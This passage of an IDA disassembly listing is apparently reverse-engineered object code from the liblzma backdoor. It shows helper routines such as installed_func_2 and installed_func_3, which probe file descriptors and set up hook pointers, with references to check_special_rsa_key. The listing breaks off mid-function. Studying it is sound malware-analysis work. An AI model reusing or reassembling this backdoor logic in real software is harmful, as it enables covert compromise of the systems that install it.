.text.threads_stoz:0000000000007BE6 _text_threads_stoz ends
.text.threads_stoz:0000000000007BE6
.text.index_decoda:0000000000007BF0 ; ===========================================================================
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0 ; Segment type: Pure code
.text.index_decoda:0000000000007BF0 ; Segment permissions: Read/Execute
.text.index_decoda:0000000000007BF0 _text_index_decoda segment para public 'CODE' use64
.text.index_decoda:0000000000007BF0                 assume cs:_text_index_decoda
.text.index_decoda:0000000000007BF0                 ;org 7BF0h
.text.index_decoda:0000000000007BF0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0 ; =============== S U B R O U T I N E =======================================
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0 ; __int64 __fastcall installed_func_2(unsigned int *, int, __int64)
.text.index_decoda:0000000000007BF0                 public installed_func_2
.text.index_decoda:0000000000007BF0 installed_func_2 proc near              ; CODE XREF: installed_func_3+98↓j
.text.index_decoda:0000000000007BF0                                         ; installed_func_0+64F↓p ...
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0 var_3C          = dword ptr -3Ch
.text.index_decoda:0000000000007BF0
.text.index_decoda:0000000000007BF0                 endbr64
.text.index_decoda:0000000000007BF4                 test    rdi, rdi
.text.index_decoda:0000000000007BF7                 jz      loc_7C88
.text.index_decoda:0000000000007BFD                 push    r15
.text.index_decoda:0000000000007BFF                 push    r14
.text.index_decoda:0000000000007C01                 push    r13
.text.index_decoda:0000000000007C03                 push    r12
.text.index_decoda:0000000000007C05                 push    rbp
.text.index_decoda:0000000000007C06                 push    rbx
.text.index_decoda:0000000000007C07                 mov     rbx, rdx
.text.index_decoda:0000000000007C0A                 sub     rsp, 18h
.text.index_decoda:0000000000007C0E                 test    rdx, rdx
.text.index_decoda:0000000000007C11                 jz      short loc_7C77
.text.index_decoda:0000000000007C13                 mov     r12, rdi
.text.index_decoda:0000000000007C16                 mov     r14d, esi
.text.index_decoda:0000000000007C19                 or      r13d, 0FFFFFFFFh
.text.index_decoda:0000000000007C1D                 xor     ebp, ebp
.text.index_decoda:0000000000007C1F                 lea     r15, [rsp+48h+var_3C]
.text.index_decoda:0000000000007C24
.text.index_decoda:0000000000007C24 loc_7C24:                               ; CODE XREF: installed_func_2+85↓j
.text.index_decoda:0000000000007C24                 xor     eax, eax
.text.index_decoda:0000000000007C26                 mov     [rsp+48h+var_3C], eax
.text.index_decoda:0000000000007C2A                 mov     rax, [rbx+60h]
.text.index_decoda:0000000000007C2E                 test    rax, rax
.text.index_decoda:0000000000007C31                 jz      short loc_7C70
.text.index_decoda:0000000000007C33                 cmp     qword ptr [rbx+50h], 0
.text.index_decoda:0000000000007C38                 jz      short loc_7C70
.text.index_decoda:0000000000007C3A                 mov     esi, 7FFFFFFFh
.text.index_decoda:0000000000007C3F                 mov     edi, ebp
.text.index_decoda:0000000000007C41                 call    rax
.text.index_decoda:0000000000007C43                 test    eax, eax
.text.index_decoda:0000000000007C45                 jns     short loc_7C4C
.text.index_decoda:0000000000007C47                 call    qword ptr [rbx+50h]
.text.index_decoda:0000000000007C4A                 jmp     short loc_7C51
.text.index_decoda:0000000000007C4C ; ---------------------------------------------------------------------------
.text.index_decoda:0000000000007C4C
.text.index_decoda:0000000000007C4C loc_7C4C:                               ; CODE XREF: installed_func_2+55↑j
.text.index_decoda:0000000000007C4C                 jz      short loc_7C5D
.text.index_decoda:0000000000007C4E                 mov     rax, r15
.text.index_decoda:0000000000007C51
.text.index_decoda:0000000000007C51 loc_7C51:                               ; CODE XREF: installed_func_2+5A↑j
.text.index_decoda:0000000000007C51                 mov     eax, [rax]
.text.index_decoda:0000000000007C53                 cmp     eax, 16h
.text.index_decoda:0000000000007C56                 jz      short loc_7C5D
.text.index_decoda:0000000000007C58                 cmp     eax, 6Bh ; 'k'
.text.index_decoda:0000000000007C5B                 jnz     short loc_7C70
.text.index_decoda:0000000000007C5D
.text.index_decoda:0000000000007C5D loc_7C5D:                               ; CODE XREF: installed_func_2:loc_7C4C↑j
.text.index_decoda:0000000000007C5D                                         ; installed_func_2+66↑j
.text.index_decoda:0000000000007C5D                 inc     r13d
.text.index_decoda:0000000000007C60                 cmp     r13d, r14d
.text.index_decoda:0000000000007C63                 jnz     short loc_7C70
.text.index_decoda:0000000000007C65                 mov     [r12], ebp
.text.index_decoda:0000000000007C69                 mov     eax, 1
.text.index_decoda:0000000000007C6E                 jmp     short loc_7C79
.text.index_decoda:0000000000007C70 ; ---------------------------------------------------------------------------
.text.index_decoda:0000000000007C70
.text.index_decoda:0000000000007C70 loc_7C70:                               ; CODE XREF: installed_func_2+41↑j
.text.index_decoda:0000000000007C70                                         ; installed_func_2+48↑j ...
.text.index_decoda:0000000000007C70                 inc     ebp
.text.index_decoda:0000000000007C72                 cmp     ebp, 40h ; '@'
.text.index_decoda:0000000000007C75                 jnz     short loc_7C24
.text.index_decoda:0000000000007C77
.text.index_decoda:0000000000007C77 loc_7C77:                               ; CODE XREF: installed_func_2+21↑j
.text.index_decoda:0000000000007C77                 xor     eax, eax
.text.index_decoda:0000000000007C79
.text.index_decoda:0000000000007C79 loc_7C79:                               ; CODE XREF: installed_func_2+7E↑j
.text.index_decoda:0000000000007C79                 add     rsp, 18h
.text.index_decoda:0000000000007C7D                 pop     rbx
.text.index_decoda:0000000000007C7E                 pop     rbp
.text.index_decoda:0000000000007C7F                 pop     r12
.text.index_decoda:0000000000007C81                 pop     r13
.text.index_decoda:0000000000007C83                 pop     r14
.text.index_decoda:0000000000007C85                 pop     r15
.text.index_decoda:0000000000007C87                 retn
.text.index_decoda:0000000000007C88 ; ---------------------------------------------------------------------------
.text.index_decoda:0000000000007C88
.text.index_decoda:0000000000007C88 loc_7C88:                               ; CODE XREF: installed_func_2+7↑j
.text.index_decoda:0000000000007C88                 xor     eax, eax
.text.index_decoda:0000000000007C8A                 retn
.text.index_decoda:0000000000007C8A installed_func_2 endp
.text.index_decoda:0000000000007C8A
.text.index_decoda:0000000000007C8A _text_index_decoda ends
.text.index_decoda:0000000000007C8A
.text.index_encoda:0000000000007C90 ; ===========================================================================
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90 ; Segment type: Pure code
.text.index_encoda:0000000000007C90 ; Segment permissions: Read/Execute
.text.index_encoda:0000000000007C90 _text_index_encoda segment para public 'CODE' use64
.text.index_encoda:0000000000007C90                 assume cs:_text_index_encoda
.text.index_encoda:0000000000007C90                 ;org 7C90h
.text.index_encoda:0000000000007C90                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90 ; =============== S U B R O U T I N E =======================================
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90 ; __int64 __fastcall installed_func_3(__int64, unsigned int *, int, int)
.text.index_encoda:0000000000007C90                 public installed_func_3
.text.index_encoda:0000000000007C90 installed_func_3 proc near              ; CODE XREF: installed_func_0+663↓p
.text.index_encoda:0000000000007C90                                         ; check_special_rsa_key+8F7↓p
.text.index_encoda:0000000000007C90                                         ; DATA XREF: ...
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90 var_4C          = dword ptr -4Ch
.text.index_encoda:0000000000007C90 var_39          = byte ptr -39h
.text.index_encoda:0000000000007C90
.text.index_encoda:0000000000007C90                 endbr64
.text.index_encoda:0000000000007C94                 push    r15
.text.index_encoda:0000000000007C96                 push    r14
.text.index_encoda:0000000000007C98                 push    r13
.text.index_encoda:0000000000007C9A                 push    r12
.text.index_encoda:0000000000007C9C                 push    rbp
.text.index_encoda:0000000000007C9D                 push    rbx
.text.index_encoda:0000000000007C9E                 sub     rsp, 28h
.text.index_encoda:0000000000007CA2                 mov     [rsp+58h+var_4C], edx
.text.index_encoda:0000000000007CA6                 test    rdi, rdi
.text.index_encoda:0000000000007CA9                 jnz     short loc_7CB2
.text.index_encoda:0000000000007CAB
.text.index_encoda:0000000000007CAB loc_7CAB:                               ; CODE XREF: installed_func_3+2C↓j
.text.index_encoda:0000000000007CAB                                         ; installed_func_3+34↓j ...
.text.index_encoda:0000000000007CAB                 xor     eax, eax
.text.index_encoda:0000000000007CAD                 jmp     loc_7D6D
.text.index_encoda:0000000000007CB2 ; ---------------------------------------------------------------------------
.text.index_encoda:0000000000007CB2
.text.index_encoda:0000000000007CB2 loc_7CB2:                               ; CODE XREF: installed_func_3+19↑j
.text.index_encoda:0000000000007CB2                 mov     rdx, [rdi+10h]
.text.index_encoda:0000000000007CB6                 mov     rbx, rdi
.text.index_encoda:0000000000007CB9                 test    rdx, rdx
.text.index_encoda:0000000000007CBC                 jz      short loc_7CAB
.text.index_encoda:0000000000007CBE                 mov     rbp, rsi
.text.index_encoda:0000000000007CC1                 test    rsi, rsi
.text.index_encoda:0000000000007CC4                 jz      short loc_7CAB
.text.index_encoda:0000000000007CC6                 mov     rax, [rdi+48h]
.text.index_encoda:0000000000007CCA                 test    rax, rax
.text.index_encoda:0000000000007CCD                 jz      short loc_7D13
.text.index_encoda:0000000000007CCF                 mov     r14, [rax]
.text.index_encoda:0000000000007CD2                 mov     rdx, rdi
.text.index_encoda:0000000000007CD5                 mov     esi, 4
.text.index_encoda:0000000000007CDA                 mov     r13d, ecx
.text.index_encoda:0000000000007CDD                 mov     rdi, r14
.text.index_encoda:0000000000007CE0                 call    _Lhc_find_func_1 ; PIC mode
.text.index_encoda:0000000000007CE5                 test    eax, eax
.text.index_encoda:0000000000007CE7                 jz      short loc_7D0F
.text.index_encoda:0000000000007CE9                 test    r13d, r13d
.text.index_encoda:0000000000007CEC                 jnz     short loc_7CF3
.text.index_encoda:0000000000007CEE                 mov     r14d, [r14]
.text.index_encoda:0000000000007CF1                 jmp     short loc_7CFC
.text.index_encoda:0000000000007CF3 ; ---------------------------------------------------------------------------
.text.index_encoda:0000000000007CF3
.text.index_encoda:0000000000007CF3 loc_7CF3:                               ; CODE XREF: installed_func_3+5C↑j
.text.index_encoda:0000000000007CF3                 dec     r13d
.text.index_encoda:0000000000007CF6                 jnz     short loc_7CAB
.text.index_encoda:0000000000007CF8                 mov     r14d, [r14+4]
.text.index_encoda:0000000000007CFC
.text.index_encoda:0000000000007CFC loc_7CFC:                               ; CODE XREF: installed_func_3+61↑j
.text.index_encoda:0000000000007CFC                 mov     [rsp+58h+var_39], 0
.text.index_encoda:0000000000007D01                 mov     r13, [rbx+10h]
.text.index_encoda:0000000000007D05                 test    r14d, r14d
.text.index_encoda:0000000000007D08                 js      short loc_7D0F
.text.index_encoda:0000000000007D0A                 test    r13, r13
.text.index_encoda:0000000000007D0D                 jnz     short loc_7D2D
.text.index_encoda:0000000000007D0F
.text.index_encoda:0000000000007D0F loc_7D0F:                               ; CODE XREF: installed_func_3+57↑j
.text.index_encoda:0000000000007D0F                                         ; installed_func_3+78↑j ...
.text.index_encoda:0000000000007D0F                 mov     rdx, [rbx+10h]
.text.index_encoda:0000000000007D13
.text.index_encoda:0000000000007D13 loc_7D13:                               ; CODE XREF: installed_func_3+3D↑j
.text.index_encoda:0000000000007D13                 mov     esi, [rsp+58h+var_4C]
.text.index_encoda:0000000000007D17                 add     rsp, 28h
.text.index_encoda:0000000000007D1B                 mov     rdi, rbp
.text.index_encoda:0000000000007D1E                 pop     rbx
.text.index_encoda:0000000000007D1F                 pop     rbp
.text.index_encoda:0000000000007D20                 pop     r12
.text.index_encoda:0000000000007D22                 pop     r13
.text.index_encoda:0000000000007D24                 pop     r14
.text.index_encoda:0000000000007D26                 pop     r15
.text.index_encoda:0000000000007D28                 jmp     installed_func_2 ; PIC mode
.text.index_encoda:0000000000007D2D ; ---------------------------------------------------------------------------
.text.index_encoda:0000000000007D2D
.text.index_encoda:0000000000007D2D loc_7D2D:                               ; CODE XREF: installed_func_3+7D↑j
.text.index_encoda:0000000000007D2D                 cmp     qword ptr [r13+48h], 0
.text.index_encoda:0000000000007D32                 jz      short loc_7D0F
.text.index_encoda:0000000000007D34                 cmp     qword ptr [r13+50h], 0
.text.index_encoda:0000000000007D39                 jz      short loc_7D0F
.text.index_encoda:0000000000007D3B                 lea     r15, [rsp+58h+var_39]
.text.index_encoda:0000000000007D40
.text.index_encoda:0000000000007D40 loc_7D40:                               ; CODE XREF: installed_func_3+CD↓j
.text.index_encoda:0000000000007D40                 xor     edx, edx
.text.index_encoda:0000000000007D42                 mov     rsi, r15
.text.index_encoda:0000000000007D45                 mov     edi, r14d
.text.index_encoda:0000000000007D48                 call    qword ptr [r13+48h]
.text.index_encoda:0000000000007D4C                 mov     r12, rax
.text.index_encoda:0000000000007D4F                 call    qword ptr [r13+50h]
.text.index_encoda:0000000000007D53                 test    r12d, r12d
.text.index_encoda:0000000000007D56                 jns     short loc_7D64
.text.index_encoda:0000000000007D58                 mov     eax, [rax]
.text.index_encoda:0000000000007D5A                 cmp     eax, 4
.text.index_encoda:0000000000007D5D                 jz      short loc_7D40
.text.index_encoda:0000000000007D5F                 cmp     eax, 9
.text.index_encoda:0000000000007D62                 jz      short loc_7D0F
.text.index_encoda:0000000000007D64
.text.index_encoda:0000000000007D64 loc_7D64:                               ; CODE XREF: installed_func_3+C6↑j
.text.index_encoda:0000000000007D64                 mov     [rbp+0], r14d
.text.index_encoda:0000000000007D68                 mov     eax, 1
.text.index_encoda:0000000000007D6D
.text.index_encoda:0000000000007D6D loc_7D6D:                               ; CODE XREF: installed_func_3+1D↑j
.text.index_encoda:0000000000007D6D                 add     rsp, 28h
.text.index_encoda:0000000000007D71                 pop     rbx
.text.index_encoda:0000000000007D72                 pop     rbp
.text.index_encoda:0000000000007D73                 pop     r12
.text.index_encoda:0000000000007D75                 pop     r13
.text.index_encoda:0000000000007D77                 pop     r14
.text.index_encoda:0000000000007D79                 pop     r15
.text.index_encoda:0000000000007D7B                 retn
.text.index_encoda:0000000000007D7B installed_func_3 endp
.text.index_encoda:0000000000007D7B
.text.index_encoda:0000000000007D7B _text_index_encoda ends
.text.index_encoda:0000000000007D7B
.text.lzma_block_unpadded_siza:0000000000007D80 ; ===========================================================================
.text.lzma_block_unpadded_siza:0000000000007D80
.text.lzma_block_unpadded_siza:0000000000007D80 ; Segment type: Pure code
.text.lzma_block_unpadded_siza:0000000000007D80 ; Segment permissions: Read/Execute
.text.lzma_block_unpadded_siza:0000000000007D80 _text_lzma_block_unpadded_siza segment para public 'CODE' use64
.text.lzma_block_unpadded_siza:0000000000007D80                 assume cs:_text_lzma_block_unpadded_siza
.text.lzma_block_unpadded_siza:0000000000007D80                 ;org 7D80h
.text.lzma_block_unpadded_siza:0000000000007D80                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_block_unpadded_siza:0000000000007D80
.text.lzma_block_unpadded_siza:0000000000007D80 ; =============== S U B R O U T I N E =======================================
.text.lzma_block_unpadded_siza:0000000000007D80
.text.lzma_block_unpadded_siza:0000000000007D80
.text.lzma_block_unpadded_siza:0000000000007D80 ; __int64 __fastcall Llzma_block_unpadded_size_1(int, int, int, int, __int64)
.text.lzma_block_unpadded_siza:0000000000007D80 _Llzma_block_unpadded_size_1 proc near  ; CODE XREF: _Lfile_info_decode_0+440↓p
.text.lzma_block_unpadded_siza:0000000000007D80                                         ; check_special_rsa_key+AA9↓p
.text.lzma_block_unpadded_siza:0000000000007D80                 endbr64
.text.lzma_block_unpadded_siza:0000000000007D84                 test    r8, r8
.text.lzma_block_unpadded_siza:0000000000007D87                 jnz     short loc_7D8C
.text.lzma_block_unpadded_siza:0000000000007D89
.text.lzma_block_unpadded_siza:0000000000007D89 loc_7D89:                               ; CODE XREF: _Llzma_block_unpadded_size_1+13↓j
.text.lzma_block_unpadded_siza:0000000000007D89                                         ; _Llzma_block_unpadded_size_1+1C↓j ...
.text.lzma_block_unpadded_siza:0000000000007D89                 xor     eax, eax
.text.lzma_block_unpadded_siza:0000000000007D8B                 retn
.text.lzma_block_unpadded_siza:0000000000007D8C ; ---------------------------------------------------------------------------
.text.lzma_block_unpadded_siza:0000000000007D8C
.text.lzma_block_unpadded_siza:0000000000007D8C loc_7D8C:                               ; CODE XREF: _Llzma_block_unpadded_size_1+7↑j
.text.lzma_block_unpadded_siza:0000000000007D8C                 mov     rax, [r8+20h]
.text.lzma_block_unpadded_siza:0000000000007D90                 test    rax, rax
.text.lzma_block_unpadded_siza:0000000000007D93                 jz      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007D95                 mov     r9, [rax+10h]
.text.lzma_block_unpadded_siza:0000000000007D99                 test    r9, r9
.text.lzma_block_unpadded_siza:0000000000007D9C                 jz      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007D9E                 cmp     dword ptr [rax+4], 0
.text.lzma_block_unpadded_siza:0000000000007DA2                 jz      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DA4                 test    edi, edi
.text.lzma_block_unpadded_siza:0000000000007DA6                 jnz     short loc_7DD0
.text.lzma_block_unpadded_siza:0000000000007DA8                 mov     rdi, [rax+0C8h]
.text.lzma_block_unpadded_siza:0000000000007DAF                 test    rdi, rdi
.text.lzma_block_unpadded_siza:0000000000007DB2                 jz      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DB4                 mov     r8d, [rdi]
.text.lzma_block_unpadded_siza:0000000000007DB7                 cmp     r8d, 2
.text.lzma_block_unpadded_siza:0000000000007DBB                 jg      short loc_7DCA
.text.lzma_block_unpadded_siza:0000000000007DBD                 test    r8d, r8d
.text.lzma_block_unpadded_siza:0000000000007DC0                 js      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DC2                 mov     dword ptr [rdi], 3
.text.lzma_block_unpadded_siza:0000000000007DC8                 jmp     short loc_7DD0
.text.lzma_block_unpadded_siza:0000000000007DCA ; ---------------------------------------------------------------------------
.text.lzma_block_unpadded_siza:0000000000007DCA
.text.lzma_block_unpadded_siza:0000000000007DCA loc_7DCA:                               ; CODE XREF: _Llzma_block_unpadded_size_1+3B↑j
.text.lzma_block_unpadded_siza:0000000000007DCA                 cmp     r8d, 3
.text.lzma_block_unpadded_siza:0000000000007DCE                 jnz     short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DD0
.text.lzma_block_unpadded_siza:0000000000007DD0 loc_7DD0:                               ; CODE XREF: _Llzma_block_unpadded_size_1+26↑j
.text.lzma_block_unpadded_siza:0000000000007DD0                                         ; _Llzma_block_unpadded_size_1+48↑j
.text.lzma_block_unpadded_siza:0000000000007DD0                 test    esi, esi
.text.lzma_block_unpadded_siza:0000000000007DD2                 jz      short loc_7DE9
.text.lzma_block_unpadded_siza:0000000000007DD4                 mov     rsi, [rax+0C0h]
.text.lzma_block_unpadded_siza:0000000000007DDB                 test    rsi, rsi
.text.lzma_block_unpadded_siza:0000000000007DDE                 jz      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DE0                 cmp     dword ptr [rsi], 1
.text.lzma_block_unpadded_siza:0000000000007DE3                 ja      short loc_7D89
.text.lzma_block_unpadded_siza:0000000000007DE5                 xor     edi, edi
.text.lzma_block_unpadded_siza:0000000000007DE7                 mov     [rsi], edi
.text.lzma_block_unpadded_siza:0000000000007DE9
.text.lzma_block_unpadded_siza:0000000000007DE9 loc_7DE9:                               ; CODE XREF: _Llzma_block_unpadded_size_1+52↑j
.text.lzma_block_unpadded_siza:0000000000007DE9                 mov     rsi, [rax+38h]
.text.lzma_block_unpadded_siza:0000000000007DED                 test    edx, edx
.text.lzma_block_unpadded_siza:0000000000007DEF                 jnz     short loc_7DF7
.text.lzma_block_unpadded_siza:0000000000007DF1                 mov     edx, [rsi-8]
.text.lzma_block_unpadded_siza:0000000000007DF4                 lea     ecx, [rdx+1]
.text.lzma_block_unpadded_siza:0000000000007DF7
.text.lzma_block_unpadded_siza:0000000000007DF7 loc_7DF7:                               ; CODE XREF: _Llzma_block_unpadded_size_1+6F↑j
.text.lzma_block_unpadded_siza:0000000000007DF7                 mov     [rax+40h], ecx
.text.lzma_block_unpadded_siza:0000000000007DFA                 mov     eax, 1
.text.lzma_block_unpadded_siza:0000000000007DFF                 mov     [rsi], r9
.text.lzma_block_unpadded_siza:0000000000007E02                 retn
.text.lzma_block_unpadded_siza:0000000000007E02 _Llzma_block_unpadded_size_1 endp
.text.lzma_block_unpadded_siza:0000000000007E02
.text.lzma_block_unpadded_siza:0000000000007E02 _text_lzma_block_unpadded_siza ends
.text.lzma_block_unpadded_siza:0000000000007E02
.text.lzma_rc_pricea:0000000000007E10 ; ===========================================================================
.text.lzma_rc_pricea:0000000000007E10
.text.lzma_rc_pricea:0000000000007E10 ; Segment type: Pure code
.text.lzma_rc_pricea:0000000000007E10 ; Segment permissions: Read/Execute
.text.lzma_rc_pricea:0000000000007E10 _text_lzma_rc_pricea segment para public 'CODE' use64
.text.lzma_rc_pricea:0000000000007E10                 assume cs:_text_lzma_rc_pricea
.text.lzma_rc_pricea:0000000000007E10                 ;org 7E10h
.text.lzma_rc_pricea:0000000000007E10                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_rc_pricea:0000000000007E10
.text.lzma_rc_pricea:0000000000007E10 ; =============== S U B R O U T I N E =======================================
.text.lzma_rc_pricea:0000000000007E10
.text.lzma_rc_pricea:0000000000007E10
.text.lzma_rc_pricea:0000000000007E10 ; __int64 __fastcall Llzma_rc_prices_1(char *, __int64)
.text.lzma_rc_pricea:0000000000007E10 _Llzma_rc_prices_1 proc near            ; CODE XREF: check_special_rsa_key+6A2↓p
.text.lzma_rc_pricea:0000000000007E10                 endbr64
.text.lzma_rc_pricea:0000000000007E14                 mov     rax, [rsi+30h]
.text.lzma_rc_pricea:0000000000007E18                 test    rdi, rdi
.text.lzma_rc_pricea:0000000000007E1B                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007E1D                 test    rax, rax
.text.lzma_rc_pricea:0000000000007E20                 jnz     short loc_7E25
.text.lzma_rc_pricea:0000000000007E22
.text.lzma_rc_pricea:0000000000007E22 loc_7E22:                               ; CODE XREF: _Llzma_rc_prices_1+B↑j
.text.lzma_rc_pricea:0000000000007E22                                         ; _Llzma_rc_prices_1+1C↓j ...
.text.lzma_rc_pricea:0000000000007E22                 xor     eax, eax
.text.lzma_rc_pricea:0000000000007E24                 retn
.text.lzma_rc_pricea:0000000000007E25 ; ---------------------------------------------------------------------------
.text.lzma_rc_pricea:0000000000007E25
.text.lzma_rc_pricea:0000000000007E25 loc_7E25:                               ; CODE XREF: _Llzma_rc_prices_1+10↑j
.text.lzma_rc_pricea:0000000000007E25                 mov     rdx, [rax+38h]
.text.lzma_rc_pricea:0000000000007E29                 test    rdx, rdx
.text.lzma_rc_pricea:0000000000007E2C                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007E2E                 mov     rcx, [rax+40h]
.text.lzma_rc_pricea:0000000000007E32                 test    rcx, rcx
.text.lzma_rc_pricea:0000000000007E35                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007E37                 mov     r9, [rax+60h]
.text.lzma_rc_pricea:0000000000007E3B                 test    r9, r9
.text.lzma_rc_pricea:0000000000007E3E                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007E40                 cmp     dword ptr [rax+4], 0
.text.lzma_rc_pricea:0000000000007E44                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007E46                 mov     dil, [rdi]
.text.lzma_rc_pricea:0000000000007E49                 mov     r10d, edi
.text.lzma_rc_pricea:0000000000007E4C                 and     r10b, 8
.text.lzma_rc_pricea:0000000000007E50                 jz      short loc_7E5B
.text.lzma_rc_pricea:0000000000007E52                 cmp     dword ptr [rsi+90h], 0
.text.lzma_rc_pricea:0000000000007E59                 jnz     short loc_7EBB
.text.lzma_rc_pricea:0000000000007E5B
.text.lzma_rc_pricea:0000000000007E5B loc_7E5B:                               ; CODE XREF: _Llzma_rc_prices_1+40↑j
.text.lzma_rc_pricea:0000000000007E5B                 mov     r8, [rcx]
.text.lzma_rc_pricea:0000000000007E5E                 test    r8, r8
.text.lzma_rc_pricea:0000000000007E61                 jz      short loc_7E7A
.text.lzma_rc_pricea:0000000000007E63                 cmp     r8, [rsi+58h]
.text.lzma_rc_pricea:0000000000007E67                 jb      short loc_7E7A
.text.lzma_rc_pricea:0000000000007E69                 cmp     r8, [rsi+60h]
.text.lzma_rc_pricea:0000000000007E6D                 jnb     short loc_7E7A
.text.lzma_rc_pricea:0000000000007E6F                 mov     [rax+38h], rcx
.text.lzma_rc_pricea:0000000000007E73                 mov     [rax+40h], rdx
.text.lzma_rc_pricea:0000000000007E77                 xchg    rcx, rdx
.text.lzma_rc_pricea:0000000000007E7A
.text.lzma_rc_pricea:0000000000007E7A loc_7E7A:                               ; CODE XREF: _Llzma_rc_prices_1+51↑j
.text.lzma_rc_pricea:0000000000007E7A                                         ; _Llzma_rc_prices_1+57↑j ...
.text.lzma_rc_pricea:0000000000007E7A                 mov     rsi, [rdx]
.text.lzma_rc_pricea:0000000000007E7D                 mov     rcx, [rcx]
.text.lzma_rc_pricea:0000000000007E80                 mov     [rax+48h], rsi
.text.lzma_rc_pricea:0000000000007E84                 mov     [rax+50h], rcx
.text.lzma_rc_pricea:0000000000007E88                 test    r10b, r10b
.text.lzma_rc_pricea:0000000000007E8B                 jnz     short loc_7E95
.text.lzma_rc_pricea:0000000000007E8D                 mov     dword ptr [rax], 1
.text.lzma_rc_pricea:0000000000007E93                 jmp     short loc_7EB8
.text.lzma_rc_pricea:0000000000007E95 ; ---------------------------------------------------------------------------
.text.lzma_rc_pricea:0000000000007E95
.text.lzma_rc_pricea:0000000000007E95 loc_7E95:                               ; CODE XREF: _Llzma_rc_prices_1+7B↑j
.text.lzma_rc_pricea:0000000000007E95                 and     dil, 10h
.text.lzma_rc_pricea:0000000000007E99                 jz      short loc_7EB8
.text.lzma_rc_pricea:0000000000007E9B                 cmp     qword ptr [rax+10h], 0
.text.lzma_rc_pricea:0000000000007EA0                 jz      short loc_7E22
.text.lzma_rc_pricea:0000000000007EA2                 cmp     qword ptr [rax+18h], 0
.text.lzma_rc_pricea:0000000000007EA7                 jz      loc_7E22
.text.lzma_rc_pricea:0000000000007EAD                 cmp     qword ptr [rax+20h], 0
.text.lzma_rc_pricea:0000000000007EB2                 jz      loc_7E22
.text.lzma_rc_pricea:0000000000007EB8
.text.lzma_rc_pricea:0000000000007EB8 loc_7EB8:                               ; CODE XREF: _Llzma_rc_prices_1+83↑j
.text.lzma_rc_pricea:0000000000007EB8                                         ; _Llzma_rc_prices_1+89↑j
.text.lzma_rc_pricea:0000000000007EB8                 mov     [rdx], r9
.text.lzma_rc_pricea:0000000000007EBB
.text.lzma_rc_pricea:0000000000007EBB loc_7EBB:                               ; CODE XREF: _Llzma_rc_prices_1+49↑j
.text.lzma_rc_pricea:0000000000007EBB                 mov     eax, 1
.text.lzma_rc_pricea:0000000000007EC0                 retn
.text.lzma_rc_pricea:0000000000007EC0 _Llzma_rc_prices_1 endp
.text.lzma_rc_pricea:0000000000007EC0
.text.lzma_rc_pricea:0000000000007EC0 _text_lzma_rc_pricea ends
.text.lzma_rc_pricea:0000000000007EC0
.text.stream_encoder_mt_iniz:0000000000007ED0 ; ===========================================================================
.text.stream_encoder_mt_iniz:0000000000007ED0
.text.stream_encoder_mt_iniz:0000000000007ED0 ; Segment type: Pure code
.text.stream_encoder_mt_iniz:0000000000007ED0 ; Segment permissions: Read/Execute
.text.stream_encoder_mt_iniz:0000000000007ED0 _text_stream_encoder_mt_iniz segment para public 'CODE' use64
.text.stream_encoder_mt_iniz:0000000000007ED0                 assume cs:_text_stream_encoder_mt_iniz
.text.stream_encoder_mt_iniz:0000000000007ED0                 ;org 7ED0h
.text.stream_encoder_mt_iniz:0000000000007ED0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_encoder_mt_iniz:0000000000007ED0
.text.stream_encoder_mt_iniz:0000000000007ED0 ; =============== S U B R O U T I N E =======================================
.text.stream_encoder_mt_iniz:0000000000007ED0
.text.stream_encoder_mt_iniz:0000000000007ED0
.text.stream_encoder_mt_iniz:0000000000007ED0 ; __int64 __fastcall Lstream_encoder_mt_init_part_0(__int64)
.text.stream_encoder_mt_iniz:0000000000007ED0 _Lstream_encoder_mt_init_part_0 proc near
.text.stream_encoder_mt_iniz:0000000000007ED0                                         ; CODE XREF: _Lfile_info_decode_0+77↓p
.text.stream_encoder_mt_iniz:0000000000007ED0                                         ; _Lfile_info_decode_0+233↓p
.text.stream_encoder_mt_iniz:0000000000007ED0                 endbr64
.text.stream_encoder_mt_iniz:0000000000007ED4                 test    rdi, rdi
.text.stream_encoder_mt_iniz:0000000000007ED7                 jz      short loc_7F4B
.text.stream_encoder_mt_iniz:0000000000007ED9                 mov     eax, [rdi+104h]
.text.stream_encoder_mt_iniz:0000000000007EDF                 cmp     eax, 2
.text.stream_encoder_mt_iniz:0000000000007EE2                 jg      short loc_7EF7
.text.stream_encoder_mt_iniz:0000000000007EE4                 test    eax, eax
.text.stream_encoder_mt_iniz:0000000000007EE6                 jg      short loc_7F05
.text.stream_encoder_mt_iniz:0000000000007EE8                 jnz     short loc_7F41
.text.stream_encoder_mt_iniz:0000000000007EEA                 cmp     qword ptr [rdi+0E8h], 0AEh
.text.stream_encoder_mt_iniz:0000000000007EF5                 jmp     short loc_7EFD
.text.stream_encoder_mt_iniz:0000000000007EF7 ; ---------------------------------------------------------------------------
.text.stream_encoder_mt_iniz:0000000000007EF7
.text.stream_encoder_mt_iniz:0000000000007EF7 loc_7EF7:                               ; CODE XREF: _Lstream_encoder_mt_init_part_0+12↑j
